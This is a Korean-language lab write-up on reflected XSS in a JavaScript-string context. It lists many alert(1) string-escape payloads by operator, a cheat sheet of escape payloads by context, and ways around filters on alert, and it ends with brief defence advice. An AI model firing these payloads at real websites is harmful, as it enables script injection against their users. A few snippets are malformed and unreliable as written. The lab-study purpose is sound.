# Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

## 개요

- **난이도**: Apprentice
- **주제**: Cross-Site Scripting (XSS) — Reflected / JavaScript 문자열 컨텍스트 탈출
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

## 목표

검색어가 JavaScript 문자열 안에 반영되는 상황에서 `'` 와 연산자를 이용해 문자열을 탈출하고 `alert()` 를 실행시킨다.

## 취약점 분석

검색어가 페이지 내 JavaScript 코드의 문자열 값으로 반영된다.

```javascript
// 정상 검색 시
var searchTerms = 'hello';
document.write('<img src="/resources/tracker.gif?searchTerms=hello">');

// <> 는 HTML 인코딩됨 → 새 태그 삽입 불가
검색: <script>alert(1)</script>
결과: var searchTerms = '&lt;script&gt;alert(1)&lt;/script&gt;';
      → 문자열로만 처리됨, 실행 안 됨
```

`<`와 `>` 는 인코딩되지만 `'` 는 인코딩되지 않는다.

## 공격 방법

### 방법 1 — 연산자로 표현식 유지 (`-` 또는 `+`)

```
검색어: '-alert(1)-'
```

생성되는 JS:

```javascript
var searchTerms = ''-alert(1)-'';
```

- 첫 번째 `'` — 기존 문자열 닫기
- `-alert(1)-` — 뺄셈 연산자 사이에 함수 호출 삽입 (유효한 JS 표현식)
- 마지막 `'` — 뒤따르는 원본 `'` 를 흡수하여 문법 오류 방지

브라우저는 `'' - alert(1) - ''` 를 하나의 표현식으로 평가하면서 `alert(1)` 을 실행한다.  
`alert()` 는 `undefined` 를 반환하므로 `'' - undefined - ''` = `NaN` 이 되지만, alert 는 이미 실행된다.

### 방법 2 — 문 종료 후 새 문 시작 (`;`)

```
검색어: ';alert(1)//
```

생성되는 JS:

```javascript
var searchTerms = '';alert(1)//'';
```

- `'` — 문자열 닫기
- `;` — 현재 문(statement) 종료
- `alert(1)` — 새 문으로 실행
- `//` — 뒤따르는 `''` 를 주석으로 처리하여 문법 오류 방지

---

## SQL Injection과의 비교

| SQL Injection | JS 문자열 XSS |
|--------------|--------------|
| `'` 로 SQL 문자열 닫기 | `'` 로 JS 문자열 닫기 |
| `;` 로 다음 쿼리 실행 | `;` 로 다음 JS 문 실행 |
| `--` 로 나머지 무력화 | `//` 로 나머지 주석 처리 |
| `' OR 1=1--` | `'-alert(1)-'` |

**컨텍스트가 달라도 탈출 패턴은 동일하다 — 현재 구문을 닫고, 코드를 삽입하고, 나머지를 무력화한다.**

---

## JavaScript에서 코드 실행에 사용 가능한 연산자 정리

JS 문자열을 탈출한 뒤 `alert()` 같은 함수 호출을 **유효한 표현식/문**으로 만들어야 한다.  
아래 연산자들이 그 역할을 한다.

### 산술 연산자

문자열과 함수 호출 사이에 삽입하면 전체가 하나의 표현식이 된다.

```javascript
// 기본 패턴: 'BEFORE' OP alert(1) OP 'AFTER'
var x = ''-alert(1)-'';   // 뺄셈 — NaN, but alert 실행
var x = ''+alert(1)+'';   // 덧셈 — "undefined", but alert 실행
var x = ''*alert(1)*'';   // 곱셈 — NaN, but alert 실행
var x = ''/alert(1)/'';   // 나눗셈 — NaN, but alert 실행 (단, //는 주석이므로 / 하나만 사용)
```

| 연산자 | 기호 | JS 문자열 탈출 페이로드 | 비고 |
|--------|------|------------------------|------|
| 뺄셈 | `-` | `'-alert(1)-'` | 가장 많이 쓰임 |
| 덧셈 | `+` | `'+alert(1)+'` | 문자열 연결로도 동작 |
| 곱셈 | `*` | `'*alert(1)*'` | |
| 거듭제곱 | `**` | `'**alert(1)**'` | ES2016 이상 |
| 나머지 | `%` | `'%alert(1)%'` | |

### 논리 연산자

조건 평가 과정에서 함수가 호출된다.

```javascript
var x = ''||alert(1)||'';   // '' 는 falsy → alert(1) 평가 (실행됨)
var x = ''&&alert(1)&&'';   // '' 는 falsy → 단락 평가로 alert 미실행 → 사용 주의
var x = '??alert(1)??'';    // ?? (nullish coalescing) — '' 는 null/undefined 아님 → 단락 → 주의
```

| 연산자 | 기호 | 동작 | XSS 활용 |
|--------|------|------|-----------|
| OR | `\|\|` | 왼쪽이 falsy면 오른쪽 평가 | `'\|\|alert(1)\|\|'` — `''` 는 falsy이므로 실행 |
| AND | `&&` | 왼쪽이 truthy면 오른쪽 평가 | `'x'&&alert(1)&&'` — `'x'` 는 truthy이므로 실행 |
| Nullish | `??` | 왼쪽이 null/undefined면 오른쪽 평가 | `''` 는 nullish 아님 → 단락 → **미실행** |

### 비교 연산자

비교 과정에서 양쪽을 모두 평가하므로 함수가 호출된다.

```javascript
var x = ''==alert(1);    // false, but alert 실행
var x = ''!=alert(1);    // true, but alert 실행
var x = ''<alert(1);     // 비교, but alert 실행 (< 는 HTML 인코딩 주의)
```

| 연산자 | 기호 | 비고 |
|--------|------|------|
| 동등 | `==` | `'==alert(1)` |
| 부등 | `!=` | `'!=alert(1)` |
| 일치 | `===` | `'===alert(1)` |
| 크다 | `>` | HTML 인코딩 환경에서 주의 |
| 작다 | `<` | HTML 인코딩 환경에서 주의 |

### 비트 연산자

피연산자를 정수로 변환하는 과정에서 함수가 호출된다.

```javascript
var x = ''|alert(1);     // 비트 OR — 0, but alert 실행
var x = ''&alert(1);     // 비트 AND — 0, but alert 실행
var x = ''^alert(1);     // 비트 XOR — 0, but alert 실행
var x = ''>>alert(1);    // 오른쪽 시프트, but alert 실행
```

| 연산자 | 기호 | 페이로드 |
|--------|------|---------|
| 비트 OR | `\|` | `'\|alert(1)` |
| 비트 AND | `&` | `'&alert(1)` |
| 비트 XOR | `^` | `'^alert(1)` |
| 비트 NOT | `~` | `'~alert(1)` (단항) |

### 콤마 연산자

왼쪽부터 순서대로 모두 평가하고 마지막 값을 반환한다.

```javascript
var x = (alert(1), 'result');  // alert 실행 후 'result' 반환
var x = ''; (alert(1)); //'';
```

### 삼항 연산자

```javascript
var x = ''?'':alert(1);  // '' 는 falsy → else 실행 → alert(1)
var x = 1?alert(1):'';   // 1 은 truthy → then 실행 → alert(1)
```

### 문 종료 연산자 (`;`)

문자열을 탈출한 뒤 완전히 새로운 문으로 시작하는 방식이다.

```javascript
// 패턴: '; alert(1); //
var x = ''; alert(1); //'';
//         ↑ 새 문   ↑ 나머지 주석 처리
```

---

## 컨텍스트별 탈출 + 실행 조합 요약

| 컨텍스트 | 예시 코드 | 페이로드 | 결과 |
|----------|-----------|---------|------|
| `'` 문자열 | `var x='INPUT'` | `'-alert(1)-'` | `var x=''-alert(1)-''` |
| `'` 문자열 | `var x='INPUT'` | `';alert(1)//` | `var x='';alert(1)//` |
| `"` 문자열 | `var x="INPUT"` | `"-alert(1)-"` | `var x=""-alert(1)-""` |
| `"` 문자열 | `var x="INPUT"` | `";alert(1)//` | `var x="";alert(1)//` |
| 백틱 문자열 | `` var x=`INPUT` `` | `` `-alert(1)-` `` | 백틱 탈출 |
| `'` 내부 이미 `\` 이스케이프 | `var x=\'INPUT\'` | `\'-alert(1)-\'` → 백슬래시 무력화 필요 | `\'` → `'`로 탈출 |

---

## 핵심 정리

- JS 문자열 안에 반영될 때 `<>` 인코딩은 무의미하다 — JS 컨텍스트를 탈출하는 건 `'` 또는 `"` 이기 때문이다.
- 탈출 후 연산자(`-`, `+`, `||`, `;` 등)로 감싸면 함수 호출이 유효한 JS 표현식/문이 된다.
- `-` 연산자가 가장 범용적이다 — 문자열, 숫자, undefined 모두에 적용 가능하고 `alert()` 실행을 보장한다.
- **방어**: JS 문자열에 삽입되는 값은 `\`, `'`, `"`, 개행을 이스케이프, JSON 직렬화 사용, CSP 적용.

## 배운 점 및 추가 학습

### 1. XSS 컨텍스트 탈출 패턴 전체 비교

```
[HTML 태그 사이]    → <script>alert(1)</script>  또는 <svg onload=alert(1)>
[HTML 속성 값]      → " onfocus=alert(1) autofocus x="
[href / src 값]     → javascript:alert(1)
[JS 문자열 값]      → '-alert(1)-'  또는  ';alert(1)//
[JS 코드 내부]      → 바로 alert(1) 삽입 가능
[CSS 값]            → </style><script>alert(1)</script>
```

### 2. JS 문자열 이스케이프가 있는 경우

서버가 `'` 를 `\'` 로 이스케이프할 때, 입력에 `\` 를 먼저 넣으면 이스케이프 문자 자체를 이스케이프할 수 있다.

```
입력:  \'-alert(1)-\'
서버:  \\'-alert(1)-\\'    ← \\ 는 리터럴 백슬래시, ' 는 문자열 종료
결과:  var x='\\'-alert(1)-\\'';
       → 탈출 성공
```

### 3. 템플릿 리터럴 (백틱 문자열) 탈출

```javascript
// 백틱 문자열
var x = `hello ${userInput} world`;

// ${} 표현식 삽입으로 탈출 가능
입력: ${alert(1)}
결과: var x = `hello ${alert(1)} world`;  → alert 실행
```

### 4. `alert` 함수 자체가 필터링될 때

```javascript
// 다양한 우회 방법
alert(1)                    // 기본
alert`1`                    // 태그드 템플릿 리터럴
window['alert'](1)          // 괄호 표기법
window['\x61lert'](1)       // 16진수 이스케이프
eval('ale'+'rt(1)')         // eval + 문자열 분할
setTimeout('alert(1)', 0)   // setTimeout 문자열 인자
Function('alert(1)')()      // Function 생성자
```
